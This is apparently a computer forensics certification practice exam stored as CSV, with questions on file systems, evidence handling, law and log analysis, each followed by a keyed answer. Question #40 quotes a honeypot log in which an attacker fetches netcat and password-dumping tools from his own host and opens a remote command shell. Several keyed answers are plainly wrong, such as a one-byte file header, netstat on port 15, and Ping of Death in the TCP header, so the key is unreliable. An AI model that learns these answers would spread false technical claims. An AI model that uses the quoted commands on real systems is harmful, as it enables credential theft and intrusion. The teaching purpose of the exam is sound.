Question,main,A,B,C,D,E,F,G,Answer
Question #11 Topic 1 ,You are working for a large clothing manufacturer as a computer forensics investigator and are called in to investigate an unusual case of an employee possibly stealing clothing designs from the company and selling them under a different brand name for a different company. What you discover during the course of the investigation is that the clothing designs are actually original products of the employee and the company has no policy against an employee selling his own designs on his own time. The only thing that you can find that the employee is doing wrong is that his clothing design incorporates the same graphic symbol as that of the company with only the wording in the graphic being different. What area of the law is the employee violating?,trademark law ,copyright law ,printright law ,brandmark law ,,,,trademark law 
Question #12 Topic 1 ,What file structure database would you expect to find on floppy disks?,NTFS ,FAT32 ,FAT16 ,FAT12 ,,,,FAT12 
Question #13 Topic 1 ,What type of attack occurs when an attacker can force a router to stop forwarding packets by flooding the router with many open connections simultaneously so that all the hosts behind the router are effectively disabled?,digital attack ,denial of service ,physical attack ,ARP redirect ,,,,denial of service 
Question #14 Topic 1 ,"When examining a file with a Hex Editor, what space does the file header occupy?",the last several bytes of the file ,the first several bytes of the file ,"none, file headers are contained in the FAT ",one byte at the beginning of the file ,,,,one byte at the beginning of the file 
Question #15 Topic 1 ,"In the context of file deletion process, which of the following statement holds true?","When files are deleted, the data is overwritten and the cluster marked as available ","The longer a disk is in use, the less likely it is that deleted files will be overwritten ","While booting, the machine may create temporary files that can delete evidence ",Secure delete programs work by completely overwriting the file in one go ,,,,"While booting, the machine may create temporary files that can delete evidence "
Question #16 Topic 1 ,"A suspect is accused of violating the acceptable use of computing resources, as he has visited adult websites and downloaded images. The investigator wants to demonstrate that the suspect did indeed visit these sites. However, the suspect has cleared the search history and emptied the cookie cache. Moreover, he has removed any images he might have downloaded. What can the investigator do to prove the violation?",Image the disk and try to recover deleted files ,Seek the help of co-workers who are eye-witnesses ,Check the Windows registry for connection data (you may or may not recover) ,Approach the websites for evidence ,,,,Image the disk and try to recover deleted files 
Question #17 Topic 1 ,A(n) _____________________ is one that's performed by a computer program rather than the attacker manually performing the steps in the attack sequence.,blackout attack ,automated attack ,distributed attack ,central processing attack ,,,,automated attack 
Question #18 Topic 1 ,The offset in a hexadecimal code is:,The last byte after the colon ,The 0x at the beginning of the code ,The 0x at the end of the code ,The first byte after the colon ,,,,The 0x at the beginning of the code 
Question #19 Topic 1 ,It takes _____________ mismanaged case/s to ruin your professional reputation as a computer forensics examiner?,"by law, three ",quite a few ,only one ,at least two ,,,,only one 
Question #20 Topic 1 ,"With the standard Linux second extended file system (Ext2fs), a file is deleted when the inode internal link count reaches ________.",0 ,10 ,100 ,1 ,,,,0 
Question #21 Topic 1 ,"When examining the log files from a Windows IIS Web Server, how often is a new log file created?",the same log is used at all times ,a new log file is created everyday ,a new log file is created each week ,a new log is created each time the Web Server is started ,,,,the same log is used at all times 
Question #22 Topic 1 ,Which part of the Windows Registry contains the user's password file?,HKEY_LOCAL_MACHINE ,HKEY_CURRENT_CONFIGURATION ,HKEY_USER ,HKEY_CURRENT_USER ,,,,HKEY_LOCAL_MACHINE 
Question #23 Topic 1 ,An employee is attempting to wipe out data stored on a couple of compact discs (CDs) and digital video discs (DVDs) by using a large magnet. You inform him that this method will not be effective in wiping out the data because CDs and DVDs are ______________ media used to store large amounts of data and are not affected by the magnet.,logical ,anti-magnetic ,magnetic ,optical ,,,,optical 
Question #24 Topic 1 ,Lance wants to place a honeypot on his network. Which of the following would be your recommendations?,Use a system that has a dynamic addressing on the network ,Use a system that is not directly interacting with the router ,Use it on a system in an external DMZ in front of the firewall ,It doesn't matter as all replies are faked ,,,,It doesn't matter as all replies are faked 
Question #25 Topic 1 ,What does the acronym POST mean as it relates to a PC?,Primary Operations Short Test ,PowerOn Self Test ,Pre Operational Situation Test ,Primary Operating System Test ,,,,PowerOn Self Test 
Question #26 Topic 1 ,"Which legal document allows law enforcement to search an office, place of business, or other locale for evidence relating to an alleged crime?",bench warrant ,wire tap ,subpoena ,search warrant ,,,,search warrant 
Question #27 Topic 1 ,"You are working as an investigator for a corporation and you have just received instructions from your manager to assist in the collection of 15 hard drives that are part of an ongoing investigation.
Your job is to complete the required evidence custody forms to properly document each piece of evidence as it is collected by other members of your team. Your manager instructs you to complete one multi-evidence form for the entire case and a single-evidence form for each hard drive. How will these forms be stored to help preserve the chain of custody of the case?",All forms should be placed in an approved secure container because they are now primary evidence in the case. ,The multi-evidence form should be placed in the report file and the single-evidence forms should be kept with each hard drive in an approved secure container. ,The multi-evidence form should be placed in an approved secure container with the hard drives and the single-evidence forms should be placed in the report file. ,All forms should be placed in the report file because they are now primary evidence in the case. ,,,,The multi-evidence form should be placed in the report file and the single-evidence forms should be kept with each hard drive in an approved secure container. 
Question #28 Topic 1 ,The MD5 program is used to:,wipe magnetic media before recycling it ,make directories on an evidence disk ,view graphics files on an evidence drive ,verify that a disk is not altered when you examine it ,,,,verify that a disk is not altered when you examine it 
Question #29 Topic 1 ,Which is a standard procedure to perform during all computer forensics investigations?,"with the hard drive removed from the suspect PC, check the date and time in the system's CMOS ","with the hard drive in the suspect PC, check the date and time in the File Allocation Table ","with the hard drive removed from the suspect PC, check the date and time in the system's RAM ","with the hard drive in the suspect PC, check the date and time in the system's CMOS ",,,,"with the hard drive removed from the suspect PC, check the date and time in the system's CMOS "
Question #31 Topic 1 ,"In a forensic examination of hard drives for digital evidence, what type of user is most likely to have the most file slack to analyze?",one who has NTFS 4 or 5 partitions ,one who uses dynamic swap file capability ,one who uses hard disk writes on IRQ 13 and 21 ,one who has lots of allocation units per block or cluster ,,,,one who has lots of allocation units per block or cluster 
Question #32 Topic 1 ,In what way do the procedures for dealing with evidence in a criminal case differ from the procedures for dealing with evidence in a civil case?,evidence must be handled in the same way regardless of the type of case ,evidence procedures are not important unless you work for a law enforcement agency ,evidence in a criminal case must be secured more tightly than in a civil case ,evidence in a civil case must be secured more tightly than in a criminal case ,,,,evidence in a criminal case must be secured more tightly than in a civil case 
Question #33 Topic 1 ,"You are assigned to work in the computer forensics lab of a state police agency. While working on a high profile criminal case, you have followed every applicable procedure, however your boss is still concerned that the defense attorney might question whether evidence has been changed while at the lab. What can you do to prove that the evidence is the same as it was when it first entered the lab?",make an MD5 hash of the evidence and compare it with the original MD5 hash that was taken when the evidence first entered the lab ,make an MD5 hash of the evidence and compare it to the standard database developed by NIST ,there is no reason to worry about this possible claim because state labs are certified ,sign a statement attesting that the evidence is the same as it was when it entered the lab ,,,,make an MD5 hash of the evidence and compare it with the original MD5 hash that was taken when the evidence first entered the lab 
Question #34 Topic 1 ,"Study the log given below and answer the following question:
Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169
Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482
Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53
Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21
Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53
Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111
Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80
Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53
Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0)
Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506)
Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080
Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558
Precautionary measures to prevent this attack would include writing firewall rules. Of these firewall rules, which among the following would be appropriate?",Disallow UDP53 in from outside to DNS server ,Allow UDP53 in from DNS server to outside ,Disallow TCP53 in from secondaries or ISP server to DNS server ,Block all UDP traffic ,,,,Disallow UDP53 in from outside to DNS server 
Question #35 Topic 1 ,"When monitoring for both intrusion and security events between multiple computers, it is essential that the computers' clocks are synchronized. Synchronized time allows an administrator to reconstruct what took place during an attack against multiple computers. Without synchronized time, it is very difficult to determine exactly when specific events took place, and how events interlace. What is the name of the service used to synchronize time among multiple computers?",Universal Time Set ,Network Time Protocol ,SyncTime Service ,Time-Sync Protocol ,,,,Network Time Protocol 
Question #36 Topic 1 ,"When investigating a potential e-mail crime, what is your first step in the investigation?",Trace the IP address to its origin ,Write a report ,Determine whether a crime was actually committed ,Recover the evidence ,,,,Trace the IP address to its origin 
Question #37 Topic 1 ,"If a suspect computer is located in an area that may have toxic chemicals, you must:",coordinate with the HAZMAT team ,determine a way to obtain the suspect computer ,assume the suspect machine is contaminated ,do not enter alone ,,,,coordinate with the HAZMAT team 
Question #38 Topic 1 ,"The following excerpt is taken from a honeypot log. The log captures activities across three days.
There are several intrusion attempts; however, a few are successful.
(Note: The objective of this question is to test whether the student can read basic information from log entries and interpret the nature of attack.)
Apr 24 14:46:46 [4663]: spp_portscan: portscan detected from 194.222.156.169
Apr 24 14:46:46 [4663]: IDS27/FIN Scan: 194.222.156.169:56693 -> 172.16.1.107:482
Apr 24 18:01:05 [4663]: IDS/DNS-version-query: 212.244.97.121:3485 -> 172.16.1.107:53
Apr 24 19:04:01 [4663]: IDS213/ftp-passwd-retrieval: 194.222.156.169:1425 -> 172.16.1.107:21
Apr 25 08:02:41 [5875]: spp_portscan: PORTSCAN DETECTED from 24.9.255.53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4499 -> 172.16.1.107:53
Apr 25 02:08:07 [5875]: IDS277/DNS-version-query: 63.226.81.13:4630 -> 172.16.1.101:53
Apr 25 02:38:17 [5875]: IDS/RPC-rpcinfo-query: 212.251.1.94:642 -> 172.16.1.107:111
Apr 25 19:37:32 [5875]: IDS230/web-cgi-space-wildcard: 198.173.35.164:4221 -> 172.16.1.107:80
Apr 26 05:45:12 [6283]: IDS212/dns-zone-transfer: 38.31.107.87:2291 -> 172.16.1.101:53
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53
Apr 26 06:44:25 victim7 PAM_pwdb[12509]: (login) session opened for user simple by (uid=0)
Apr 26 06:44:36 victim7 PAM_pwdb[12521]: (su) session opened for user simon by simple(uid=506)
Apr 26 06:45:34 [6283]: IDS175/socks-probe: 24.112.167.35:20 -> 172.16.1.107:1080
Apr 26 06:52:10 [6283]: IDS127/telnet-login-incorrect: 172.16.1.107:23 -> 213.28.22.189:4558
From the options given below choose the one which best interprets the following entry:
Apr 26 06:43:05 [6283]: IDS181/nops-x86: 63.226.81.13:1351 -> 172.16.1.107:53",An IDS evasion technique ,A buffer overflow attempt ,A DNS zone transfer ,Data being retrieved from 63.226.81.13 ,,,,An IDS evasion technique 
Question #39 Topic 1 ,What happens when a file is deleted by a Microsoft operating system using the FAT file system?,only the reference to the file is removed from the FAT ,the file is erased and cannot be recovered ,a copy of the file is stored and the original file is erased ,the file is erased but can be recovered ,,,,only the reference to the file is removed from the FAT 
Question #40 Topic 1 ,"The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort reported Unicode attacks from 213.116.251.162. The File Permission
Canonicalization vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally have the right to run scripts. The attacker tries a
Unicode attack and eventually succeeds in displaying boot.ini.
He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability allows a malicious user to construct SQL statements that will execute shell commands (such as CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which results in the commands run as shown below.
""cmd1.exe /c open 213.116.251.162 >ftpcom""
""cmd1.exe /c echo johna2k >>ftpcom""
""cmd1.exe /c echo haxedj00 >>ftpcom""
""cmd1.exe /c echo get nc.exe >>ftpcom""
""cmd1.exe /c echo get pdump.exe >>ftpcom""
""cmd1.exe /c echo get samdump.dll >>ftpcom""
""cmd1.exe /c echo quit >>ftpcom""
""cmd1.exe /c ftp -s:ftpcom""
""cmd1.exe /c nc -l -p 6969 -e cmd1.exe""
What can you infer from the exploit given?",It is a local exploit where the attacker logs in using username johna2k ,There are two attackers on the system - johna2k and haxedj00 ,The attack is a remote exploit and the hacker downloads three files ,The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port ,,,,The attack is a remote exploit and the hacker downloads three files 
Question #41 Topic 1 ,What term is used to describe a cryptographic technique for embedding information into something else for the sole purpose of hiding that information from the casual observer?,rootkit ,key escrow ,steganography ,Offset ,,,,steganography 
Question #42 Topic 1 ,"During the course of an investigation, you locate evidence that may prove the innocence of the suspect of the investigation. You must maintain an unbiased opinion and be objective in your entire fact finding process. Therefore, you report this evidence. This type of evidence is known as:",Inculpatory evidence ,Mandatory evidence ,Exculpatory evidence ,Terrible evidence ,,,,Exculpatory evidence 
Question #43 Topic 1 ,"If you discover a criminal act while investigating a corporate policy abuse, it becomes a publicsector investigation and should be referred to law enforcement?",true ,false ,,,,,,true 
Question #44 Topic 1 ,What binary coding is used most often for e-mail purposes?,MIME ,Uuencode ,IMAP ,SMTP ,,,,MIME 
Question #45 Topic 1 ,"If you see the files Zer0.tar.gz and copy.tar.gz on a Linux system while doing an investigation, what can you conclude?",The system files have been copied by a remote attacker ,The system administrator has created an incremental backup ,The system has been compromised using a t0rnrootkit ,Nothing in particular as these can be operational files ,,,,Nothing in particular as these can be operational files 
Question #46 Topic 1 ,"From the following spam mail header, identify the host IP that sent this spam?
From jie02@netvigator.com jie02@netvigator.com Tue Nov 27 17:27:11 2001
Received: from viruswall.ie.cuhk.edu.hk (viruswall [137.189.96.52]) by eng.ie.cuhk.edu.hk
(8.11.6/8.11.6) with ESMTP id
fAR9RAP23061 for ; Tue, 27 Nov 2001 17:27:10 +0800 (HKT)
Received: from mydomain.com (pcd249020.netvigator.com [203.218.39.20]) by viruswall.ie.cuhk.edu.hk (8.12.1/8.12.1) with SMTP id fAR9QXwZ018431 for ; Tue, 27 Nov 2001 17:26:36 +0800 (HKT)
Message-Id: >200111270926.fAR9QXwZ018431@viruswall.ie.cuhk.edu.hk
From: ""china hotel web""
To: ""Shlam""
Subject: SHANGHAI (HILTON HOTEL) PACKAGE
Date: Tue, 27 Nov 2001 17:25:58 +0800 MIME-Version: 1.0
X-Priority: 3 X-MSMail-

Priority: Normal -
Reply-To: ""china hotel web""",137.189.96.52 ,8.12.1.0 ,203.218.39.20 ,203.218.39.50 ,,,,203.218.39.20 
Question #47 Topic 1 ,"If you plan to startup a suspect's computer, you must modify the ___________ to ensure that you do not contaminate or alter data on the suspect's hard drive by booting to the hard drive.",deltree command ,CMOS ,Boot.sys ,Scandisk utility ,,,,CMOS 
Question #48 Topic 1 ,"You are working for a local police department that services a population of 1,000,000 people and you have been given the task of building a computer forensics lab. How many law-enforcement computer investigators should you request to staff the lab?",8 ,1 ,4 ,2 ,,,,4 
Question #49 Topic 1 ,"When obtaining a warrant, it is important to:",particularlydescribe the place to be searched and particularly describe the items to be seized ,generallydescribe the place to be searched and particularly describe the items to be seized ,generallydescribe the place to be searched and generally describe the items to be seized ,particularlydescribe the place to be searched and generally describe the items to be seized ,,,,particularlydescribe the place to be searched and particularly describe the items to be seized 
Question #50 Topic 1 ,What does the superblock in Linux define?,filesynames ,diskgeometr ,location of the firstinode ,available space ,,,,location of the firstinode 
Question #51 Topic 1 ,Diskcopy is:,a utility by AccessData ,a standard MS-DOS command ,Digital Intelligence utility ,dd copying tool ,,,,a standard MS-DOS command 
Question #52 Topic 1 ,Sectors in hard disks typically contain how many bytes?,256 ,512 ,1024 ,2048 ,,,,512 
Question #53 Topic 1 ,Area density refers to:,the amount of data per disk ,the amount of data per partition ,the amount of data per square inch ,the amount of data per platter ,,,,the amount of data per disk 
Question #54 Topic 1 ,Corporate investigations are typically easier than public investigations because:,the users have standard corporate equipment and software ,the investigator does not have to get a warrant ,the investigator has to get a warrant ,the users can load whatever they want on their machines ,,,,the investigator does not have to get a warrant 
Question #55 Topic 1 ,Which of the following should a computer forensics lab used for investigations have?,isolation ,restricted access ,open access ,an entry log ,,,,restricted access 
Question #56 Topic 1 ,"Jason is the security administrator of ACMA metal Corporation. One day he notices the company's Oracle database server has been compromised and the customer information along with financial data has been stolen. The financial loss will be in millions of dollars if the database gets into the hands of the competitors. Jason wants to report this crime to the law enforcement agencies immediately.
Which organization coordinates computer crimes investigations throughout the United States?",Internet Fraud Complaint Center ,Local or national office of the U.S. Secret Service ,National Infrastructure Protection Center ,CERT Coordination Center ,,,,Local or national office of the U.S. Secret Service 
Question #57 Topic 1 ,Which Intrusion Detection System (IDS) usually produces the most false alarms due to the unpredictable behaviors of users and networks?,network-based IDS systems (NIDS) ,host-based IDS systems (HIDS) ,anomaly detection ,signature recognition ,,,,host-based IDS systems (HIDS) 
Question #58 Topic 1 ,You should make at least how many bit-stream copies of a suspect drive?,1 ,2 ,3 ,4 ,,,,2 
Question #59 Topic 1 ,Why should you note all cable connections for a computer you want to seize as evidence?,to know what outside connections existed ,in case other devices were connected ,to know what peripheral devices exist ,to know what hardware existed ,,,,to know what outside connections existed 
Question #60 Topic 1 ,What header field in the TCP/IP protocol stack involves the hacker exploit known as the Ping of Death?,ICMP header field ,TCP header field ,IP header field ,UDP header field ,,,,TCP header field 
Question #61 Topic 1 ,What method of computer forensics will allow you to trace all ever-established user accounts on a Windows 2000 sever the course of its lifetime?,forensic duplication of hard drive ,analysis of volatile data ,comparison of MD5 checksums ,review of SIDs in the Registry ,,,,comparison of MD5 checksums 
Question #62 Topic 1 ,Which response organization tracks hoaxes as well as viruses?,NIPC ,FEDCIRC ,CERT ,CIAC ,,,,CIAC 
Question #63 Topic 1 ,Which federal computer crime law specifically refers to fraud and related activity in connection with access devices like routers?,18 U.S.C. 1029 ,18 U.S.C. 1362 ,18 U.S.C. 2511 ,18 U.S.C. 2703 ,,,,18 U.S.C. 1029 
Question #64 Topic 1 ,"Office documents (Word, Excel, PowerPoint) contain a code that allows tracking the MAC, or unique identifier, of the machine that created the document. What is that code called?",the Microsoft Virtual Machine Identifier ,the Personal Application Protocol ,the Globally Unique ID ,the Individual ASCII String ,,,,the Globally Unique ID 
Question #65 Topic 1 ,What TCP/UDP port does the toolkit program netstat use?,Port 7 ,Port 15 ,Port 23 ,Port 69 ,,,,Port 15 
Question #66 Topic 1 ,Under which Federal Statutes does FBI investigate for computer crimes involving e-mail scams and mail fraud?,18 U.S.C. 1029 Possession of Access Devices ,18 U.S.C. 1030 Fraud and related activity in connection with computers ,"18 U.S.C. 1343 Fraud by wire, radio or television ",18 U.S.C. 1361 Injury to Government Property ,18 U.S.C. 1362 Government communication systems ,18 U.S.C. 1831 Economic Espionage Act ,18 U.S.C. 1832 Trade Secrets Act ,18 U.S.C. 1030 Fraud and related activity in connection with computers 
Question #67 Topic 1 ,"In a FAT32 system, a 123 KB file will use how many sectors?",34 ,25 ,11 ,56 ,,,,25 
Question #68 Topic 1 ,"You have been asked to investigate the possibility of computer fraud in the finance department of a company. It is suspected that a staff member has been committing finance fraud by printing cheques that have not been authorized. You have exhaustively searched all data files on a bitmap image of the target computer, but have found no evidence. You suspect the files may not have been saved. What should you examine next in this case?",The registry ,The swap file ,The recycle bin ,The metadata ,,,,The swap file 
Question #69 Topic 1 ,"When performing a forensics analysis, what device is used to prevent the system from recording data on an evidence disk?",a write-blocker ,a protocol analyzer ,a firewall ,a disk editor ,,,,a write-blocker 
Question #70 Topic 1 ,How many sectors will a 125 KB file use in a FAT32 file system?,32 ,16 ,256 ,25 ,,,,256 
Question #71 Topic 1 ,You are called by an author who is writing a book and he wants to know how long the copyright for his book will last after he has the book published?,70 years ,the life of the author ,the life of the author plus 70 years ,copyrights last forever ,,,,the life of the author plus 70 years 
Question #72 Topic 1 ,"When investigating a network that uses DHCP to assign IP addresses, where would you look to determine which system (MAC address) had a specific IP address at a specific time?",on the individual computer's ARP cache ,in the Web Server log files ,in the DHCP Server log files ,there is no way to determine the specific IP address ,,,,in the DHCP Server log files 
Question #73 Topic 1 ,"Bob has been trying to penetrate a remote production system for the past two weeks. This time however, he is able to get into the system. He was able to use the
System for a period of three weeks. However, law enforcement agencies were recoding his every activity and this was later presented as evidence.
The organization had used a Virtual Environment to trap Bob. What is a Virtual Environment?",A Honeypot that traps hackers ,A system Using Trojaned commands ,An environment set up after the user logs in ,An environment set up before a user logs in ,,,,A Honeypot that traps hackers 
Question #74 Topic 1 ,"To make sure the evidence you recover and analyze with computer forensics software can be admitted in court, you must test and validate the software. What group is actively providing tools and creating procedures for testing and validating computer forensics software?",Computer Forensics Tools and Validation Committee (CFTVC) ,Association of Computer Forensics Software Manufactures (ACFSM) ,National Institute of Standards and Technology (NIST) ,Society for Valid Forensics Tools and Testing (SVFTT) ,,,,National Institute of Standards and Technology (NIST) 
Question #75 Topic 1 ,"With Regard to using an Antivirus scanner during a computer forensics investigation, You should:",Scan the suspect hard drive before beginning an investigation ,Never run a scan on your forensics workstation because it could change your systems configuration ,Scan your forensics workstation at intervals of no more than once every five minutes during an investigation ,Scan your Forensics workstation before beginning an investigation ,,,,Scan your Forensics workstation before beginning an investigation 
Question #76 Topic 1 ,Windows identifies which application to open a file with by examining which of the following?,The File extension ,The file attributes ,The file Signature at the end of the file ,The file signature at the beginning of the file ,,,,The File extension 
Question #77 Topic 1 ,"You have used a newly released forensic investigation tool, which doesn't meet the Daubert Test, during a case. The case has ended-up in court. What argument could the defense make to weaken your case?",The tool hasn't been tested by the International Standards Organization (ISO) ,Only the local law enforcement should use the tool ,The total has not been reviewed and accepted by your peers ,You are not certified for using the tool ,,,,The total has not been reviewed and accepted by your peers 
Question #78 Topic 1 ,Which of the following is NOT a graphics file?,Picture1.tga ,Picture2.bmp ,Picture3.nfo ,Picture4.psd ,,,,Picture3.nfo 
Question #79 Topic 1 ,"When conducting computer forensic analysis, you must guard against ______________ So that you remain focused on the primary job and insure that the level of work does not increase beyond what was originally expected.",Hard Drive Failure ,Scope Creep ,Unauthorized expenses ,Overzealous marketing ,,,,Scope Creep 
Question #80 Topic 1 ,"In General, __________________ Involves the investigation of data that can be retrieved from the hard disk or other disks of a computer by applying scientific methods to retrieve the data.",Network Forensics ,Data Recovery ,Disaster Recovery ,Computer Forensics ,,,,Computer Forensics 
Question #81 Topic 1 ,"When you carve an image, recovering the image depends on which of the following skills?",Recognizing the pattern of the header content ,Recovering the image from a tape backup ,Recognizing the pattern of a corrupt file ,Recovering the image from the tape backup ,,,,Recognizing the pattern of the header content 
Question #82 Topic 1 ,"When a file is deleted by Windows Explorer or through the MS-DOS delete command, the operating system inserts _______________ in the first letter position of the filename in the FAT database.",A Capital X ,A Blank Space ,The Underscore Symbol ,The lowercase Greek Letter Sigma (s) ,,,,The lowercase Greek Letter Sigma (s) 
Question #83 Topic 1 ,"While working for a prosecutor, what do you think you should do if the evidence you found appears to be exculpatory and is not being released to the defense?",Keep the information of file for later review ,Destroy the evidence ,"Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge ",Present the evidence to the defense attorney ,,,,"Bring the information to the attention of the prosecutor, his or her supervisor or finally to the judge "
Question #84 Topic 1 ,"In Microsoft file structures, sectors are grouped together to form:",Clusters ,Drives ,Bitstreams ,Partitions ,,,,Clusters 
